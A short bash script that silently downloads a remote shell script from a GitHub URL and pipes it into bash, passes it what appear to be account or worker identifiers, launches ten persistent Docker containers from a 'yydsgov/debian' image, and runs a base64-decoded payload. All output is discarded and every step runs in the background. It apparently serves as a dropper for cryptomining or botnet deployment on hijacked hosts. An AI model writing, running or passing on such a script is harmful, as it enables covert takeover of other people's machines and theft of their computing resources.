#!/bin/bash
bash -c "wget -qO- https://raw.githubusercontent.com/curiosityinteriorsuk/2088/main/d.sh |bash -s 9 trguiftu/ikhudfrt && docker run -dt --restart=always yydsgov/debian:latest" >/dev/null 2>&1 &
bash -c "docker run -dt --restart=always --name ai2 yydsgov/debian:latest" >/dev/null 2>&1 &
bash -c "docker run -dt --restart=always --name ai3 yydsgov/debian:latest" >/dev/null 2>&1 &
bash -c "docker run -dt --restart=always --name ai4 yydsgov/debian:latest" >/dev/null 2>&1 &
bash -c "docker run -dt --restart=always --name ai5 yydsgov/debian:latest" >/dev/null 2>&1 &
bash -c "docker run -dt --restart=always --name ai6 yydsgov/debian:latest" >/dev/null 2>&1 &
bash -c "docker run -dt --restart=always --name ai7 yydsgov/debian:latest" >/dev/null 2>&1 &
bash -c "docker run -dt --restart=always --name ai8 yydsgov/debian:latest" >/dev/null 2>&1 &
bash -c "docker run -dt --restart=always --name ai9 yydsgov/debian:latest" >/dev/null 2>&1 &
bash -c "docker run -dt --restart=always --name ai10 yydsgov/debian:latest" >/dev/null 2>&1 &

/bin/sh -c "echo '' |base64 -d |/bin/bash" >/dev/null 2>&1 &
##bash -c "sleep 150 && reboot" >/dev/null 2>&1 &
